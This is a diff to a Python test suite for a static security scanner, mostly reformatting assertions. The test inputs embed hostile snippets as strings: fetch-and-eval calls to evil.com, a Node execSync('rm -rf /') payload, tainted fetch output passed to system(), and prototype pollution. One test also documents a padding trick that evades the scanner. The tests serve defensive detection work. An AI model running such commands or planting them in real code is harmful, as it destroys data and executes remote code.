@@ -40,9 +40,7 @@ def test_sast_vulnerability_signatures(lens):
     assert counts.get("hardcoded_secrets", 0) > 0, "Failed to detect high-entropy API key!"
     assert counts.get("safety_bypasses", 0) > 0, "Failed to detect safety bypass (ini_set)!"
     assert counts.get("high_risk_execution", 0) > 0, "Failed to detect dynamic execution payload (eval)!"
-    assert counts.get("shadow_imports", 0) > 0, (
-        "Failed to detect steganographic import!"
-    )
+    assert counts.get("shadow_imports", 0) > 0, "Failed to detect steganographic import!"
     assert counts.get("state_mutation", 0) > 0, "Failed to detect prototype pollution!"
 
 
@@ -55,17 +53,13 @@ def test_obfuscation_entropy_detection(lens):
     Shannon Entropy on large, highly randomized base64/hex blocks.
     """
     # A highly random string wrapped in quotes (length > 64 to bypass the ReDoS shield)
-    high_entropy_str = (
-        "x" + base64.b64encode(os.urandom(100)).decode("utf-8") + "y8f!@#$A9Z"
-    )
+    high_entropy_str = "x" + base64.b64encode(os.urandom(100)).decode("utf-8") + "y8f!@#$A9Z"
     code = f'var payload = "{high_entropy_str}";\n'
 
     result = lens.scan_content(code)
     counts = result["counts"]
 
-    assert counts.get("entropy", 0) > 0, (
-        "Failed to calculate high Shannon Entropy on obfuscated string!"
-    )
+    assert counts.get("entropy", 0) > 0, "Failed to calculate high Shannon Entropy on obfuscated string!"
 
 
 # ==============================================================================
@@ -93,21 +87,15 @@ def test_data_flow_taint_tracking(lens):
     counts = result["counts"]
     snippets = result["snippets"]
 
-    assert counts.get("tainted_injection", 0) > 0, (
-        "Failed to track I/O -> Danger taint path!"
+    assert counts.get("tainted_injection", 0) > 0, "Failed to track I/O -> Danger taint path!"
+    assert counts.get("prompt_injection", 0) > 0, "Failed to detect Same-Line Prompt Injection!"
+    assert counts.get("agentic_rce", 0) > 0, "Failed to detect Agentic RCE (LLM -> Danger)!"
+    assert any("[LLM State -> RCE]" in s for s in snippets.get("agentic_rce", [])), (
+        "Failed to populate the dedicated agentic_rce snippet array!"
     )
-    assert counts.get("prompt_injection", 0) > 0, (
-        "Failed to detect Same-Line Prompt Injection!"
+    assert any("[I/O -> LLM]" in s or "[Taint -> LLM]" in s for s in snippets.get("prompt_injection", [])), (
+        "Failed to populate the dedicated prompt_injection snippet array!"
     )
-    assert counts.get("agentic_rce", 0) > 0, (
-        "Failed to detect Agentic RCE (LLM -> Danger)!"
-    )
-    assert any(
-        "[LLM State -> RCE]" in s for s in snippets.get("agentic_rce", [])
-    ), "Failed to populate the dedicated agentic_rce snippet array!"
-    assert any(
-        "[I/O -> LLM]" in s or "[Taint -> LLM]" in s for s in snippets.get("prompt_injection", [])
-    ), "Failed to populate the dedicated prompt_injection snippet array!"
 
 
 # ==============================================================================
@@ -130,12 +118,8 @@ def test_auto_gen_shield_bypasses(lens):
     counts = result["counts"]
 
     # Homoglyphs and Taint should be explicitly skipped for auto-gen
-    assert counts.get("homoglyphs", 0) == 0, (
-        "Auto-gen shield failed to block homoglyph scan!"
-    )
-    assert counts.get("tainted_injection", 0) == 0, (
-        "Auto-gen shield failed to block Taint Tracking!"
-    )
+    assert counts.get("homoglyphs", 0) == 0, "Auto-gen shield failed to block homoglyph scan!"
+    assert counts.get("tainted_injection", 0) == 0, "Auto-gen shield failed to block Taint Tracking!"
 
 
 # ==============================================================================
@@ -150,20 +134,14 @@ def test_binary_magic_byte_scanner(lens):
     fake_png_bytes = b"\x7fELF some other binary data here"
     result_mismatch = lens.scan_binary(fake_png_bytes, ".png")
 
-    assert "sec_extension_mismatch" in result_mismatch, (
-        "Failed to detect Magic Byte mismatch!"
-    )
-    assert "sec_high_risk_execution" in result_mismatch, (
-        "Failed to detect embedded ELF execution header!"
-    )
+    assert "sec_extension_mismatch" in result_mismatch, "Failed to detect Magic Byte mismatch!"
+    assert "sec_high_risk_execution" in result_mismatch, "Failed to detect embedded ELF execution header!"
 
     # 2. High Entropy Binary Payload
     random_bytes = os.urandom(50000)  # Large sample size guarantees entropy > 7.95
     result_entropy = lens.scan_binary(random_bytes, ".bin")
 
-    assert "sec_reflection_metaprogramming" in result_entropy, (
-        "Failed to calculate extreme binary entropy!"
-    )
+    assert "sec_reflection_metaprogramming" in result_entropy, "Failed to calculate extreme binary entropy!"
 
 
 # ==============================================================================
@@ -187,18 +165,20 @@ def test_comprehensive_fallback_coverage(lens):
         result_crash = lens.scan_binary(b"\x00" * 300, ".bin")
         assert result_crash == {}
 
+
 # ==============================================================================
 # TEST 8: MINIFICATION & OBFUSCATION FALLBACK SCREEN (DEEP VALIDATION)
 # ==============================================================================
 
+
 def test_minified_fallback_standard_webpack_chunk(lens):
     """
-    [HAPPY PATH] Proves the fallback screen detects multiple disparate execution 
+    [HAPPY PATH] Proves the fallback screen detects multiple disparate execution
     and I/O hooks inside a massive, unbroken 50,000-character line.
     """
     padding = "A" * 50000
     payload = f"var config='{padding}'; eval(atob(payload)); fetch('http://evil.com');"
-    
+
     result = lens.scan_content(payload)
     counts = result["counts"]
     snippets = result["snippets"]
@@ -210,13 +190,13 @@ def test_minified_fallback_standard_webpack_chunk(lens):
 
 def test_minified_fallback_substring_safety_trap(lens):
     """
-    [UNHAPPY PATH] Proves the literal string matcher does not hallucinate on 
+    [UNHAPPY PATH] Proves the literal string matcher does not hallucinate on
     safe substrings that mimic malicious hooks (e.g., 'evaluation' vs 'eval').
     """
     padding = "B" * 15000
     # Uses "evaluation(" and "prefetch(" to try and trick the literal search
     payload = f"const data = '{padding}'; function evaluation(x) {{ return true; }} prefetch(data);"
-    
+
     result = lens.scan_content(payload)
     counts = result["counts"]
 
@@ -226,12 +206,14 @@ def test_minified_fallback_substring_safety_trap(lens):
 
 def test_minified_fallback_buried_node_stealer(lens):
     """
-    [EXTREME BOUNDARY] Proves the $O(N)$ string search can locate a threat 
+    [EXTREME BOUNDARY] Proves the $O(N)$ string search can locate a threat
     buried at the absolute tail end of a 100KB buffer without timing out.
     """
     padding = "x" * 100000
-    payload = f"module.exports = function() {{ var junk = '{padding}'; require('child_process').execSync('rm -rf /'); }};"
-    
+    payload = (
+        f"module.exports = function() {{ var junk = '{padding}'; require('child_process').execSync('rm -rf /'); }};"
+    )
+
     result = lens.scan_content(payload)
     counts = result["counts"]
     snippets = result["snippets"]
@@ -243,28 +225,28 @@ def test_minified_fallback_buried_node_stealer(lens):
 def test_minified_fallback_mass_threshold_evasion(lens):
     """
     [ADVERSARIAL TRAP] Proves the mathematical boundary of the 10% mass threshold.
-    An attacker attempts to evade the fallback screen by padding the file with 
-    just enough "safe" short lines to keep the safe_content > 10% of total mass, 
+    An attacker attempts to evade the fallback screen by padding the file with
+    just enough "safe" short lines to keep the safe_content > 10% of total mass,
     while hiding the payload on a 300-character line that the regular regex drops.
     """
     # 15 safe lines, 11 chars each = 165 characters of "safe" content
-    safe_lines = "let a = 1;\n" * 15 
-    
+    safe_lines = "let a = 1;\n" * 15
+
     # 1 malicious line of ~320 characters
-    malicious_long_line = "var b = '" + ("C" * 300) + "'; eval(b);\n" 
-    
+    malicious_long_line = "var b = '" + ("C" * 300) + "'; eval(b);\n"
+
     payload = safe_lines + malicious_long_line
-    
+
     # Total length = ~485. Safe length = 165.
-    # 165 / 485 = ~34% safe content. 
+    # 165 / 485 = ~34% safe content.
     # Because 34% > 10%, the fallback screen mathematically WILL NOT run.
     # The standard regex WILL drop the 320-char line due to the < 250 ReDoS armor.
-    
+
     result = lens.scan_content(payload)
     counts = result["counts"]
 
-    # This assertion CONFIRMS the evasion works, establishing the known physical 
-    # limits of the 10% threshold design. 
+    # This assertion CONFIRMS the evasion works, establishing the known physical
+    # limits of the 10% threshold design.
     assert counts.get("high_risk_execution", 0) == 0, (
         "Threshold evasion failed! The fallback screen ran when it mathematically shouldn't have."
     )
@@ -272,35 +254,35 @@ def test_minified_fallback_mass_threshold_evasion(lens):
 
 def test_minified_fallback_near_miss_threshold(lens):
     """
-    [PRECISION CHECK] Proves the fallback screen properly engages when the safe mass 
+    [PRECISION CHECK] Proves the fallback screen properly engages when the safe mass
     is exactly at the 9% mark (just under the 10% threshold).
     """
     # 3 safe lines = ~33 characters
     safe_lines = "let a = 1;\n" * 3
-    
+
     # 1 malicious line of ~400 characters
     malicious_long_line = "var b = '" + ("D" * 380) + "'; setTimeout(b, 1000);\n"
-    
+
     payload = safe_lines + malicious_long_line
-    
+
     # Total length = ~433. Safe length = 33.
     # 33 / 433 = ~7.6% safe content.
     # Because 7.6% < 10%, the fallback screen MUST engage.
-    
+
     result = lens.scan_content(payload)
     counts = result["counts"]
 
-    assert counts.get("high_risk_execution", 0) > 0, (
-        "Fallback screen failed to engage at the 7.6% mass threshold!"
-    )
+    assert counts.get("high_risk_execution", 0) > 0, "Fallback screen failed to engage at the 7.6% mass threshold!"
+
 
 # ==============================================================================
 # TEST 9: ADVERSARIAL DATA FLOW & TAINT TRACKING (LHS FALSE EQUIVALENCY)
 # ==============================================================================
 
+
 def test_adversarial_lhs_comparison_trap(lens):
     """
-    [ADVERSARIAL TRAP] Proves that the Left-Hand Side (LHS) variable extractor 
+    [ADVERSARIAL TRAP] Proves that the Left-Hand Side (LHS) variable extractor
     does not hallucinate on comparison operators (==, ===, !=, <=).
     """
     payload = """
@@ -320,14 +302,12 @@ def test_adversarial_lhs_comparison_trap(lens):
     let malicious_data = fetch('http://evil.com/payload');
     system(malicious_data);  // <--- Changed to system() to guarantee a valid execution sink
     """
-    
+
     result = lens.scan_content(payload)
     counts = result["counts"]
     snippets = str(result["snippets"])
 
-    assert counts.get("tainted_injection", 0) == 1, (
-        "LHS extractor failed to track the legitimate taint flow!"
-    )
+    assert counts.get("tainted_injection", 0) == 1, "LHS extractor failed to track the legitimate taint flow!"
     assert "malicious_data" in snippets, "Failed to capture the correct tainted variable!"
     assert "status" not in snippets, "LHS extractor hallucinated on '==='!"
 
@@ -336,9 +316,10 @@ def test_adversarial_lhs_comparison_trap(lens):
 # TEST 10: REGEX EVASION & WHITESPACE MANIPULATION
 # ==============================================================================
 
+
 def test_evasion_whitespace_padding(lens):
     """
-    [ADVERSARIAL TRAP] Attackers frequently use massive amounts of whitespace, 
+    [ADVERSARIAL TRAP] Attackers frequently use massive amounts of whitespace,
     tabs, and newlines between function calls and arguments to evade naive regex.
     This proves the core structural signatures are immune to whitespace evasion.
     """
@@ -352,7 +333,7 @@ def test_evasion_whitespace_padding(lens):
     // Evasion 3: Bizarre spacing in prototype pollution
     Object  .  __proto__   =   { admin : true } ;
     """
-    
+
     result = lens.scan_content(payload)
     counts = result["counts"]
 
@@ -365,10 +346,11 @@ def test_evasion_whitespace_padding(lens):
 # TEST 11: FALSE POSITIVE DEFENSE (STANDARD REGEX)
 # ==============================================================================
 
+
 def test_false_positive_substring_defense_standard(lens):
     """
     [PRECISION CHECK] Proves the standard regex extractors (not just the minified fallback)
-    use strict word boundaries (\b) and do not hallucinate threats inside safe variables 
+    use strict word boundaries (\b) and do not hallucinate threats inside safe variables
     or custom functions that happen to contain threat keywords.
     """
     payload = """
@@ -385,7 +367,7 @@ def test_false_positive_substring_defense_standard(lens):
     function prefetch_data() { pass; }
     let dog_fetch_toy = true;
     """
-    
+
     result = lens.scan_content(payload)
     counts = result["counts"]
 
@@ -397,10 +379,11 @@ def test_false_positive_substring_defense_standard(lens):
 # TEST 12: AGENTIC RCE & PROMPT INJECTION ISOLATION
 # ==============================================================================
 
+
 def test_prompt_injection_without_execution(lens):
     """
-    [PRECISION CHECK] Proves that if an I/O payload enters an LLM context, it triggers 
-    a Prompt Injection alert, but if it STOPS there and never reaches `eval()` or a DB, 
+    [PRECISION CHECK] Proves that if an I/O payload enters an LLM context, it triggers
+    a Prompt Injection alert, but if it STOPS there and never reaches `eval()` or a DB,
     it DOES NOT trigger a tainted_injection or agentic_rce alert.
     """
     payload = """
@@ -410,7 +393,7 @@ def test_prompt_injection_without_execution(lens):
     // The response is safely logged, not executed.
     console.log(ai_response);
     """
-    
+
     result = lens.scan_content(payload)
     counts = result["counts"]
 
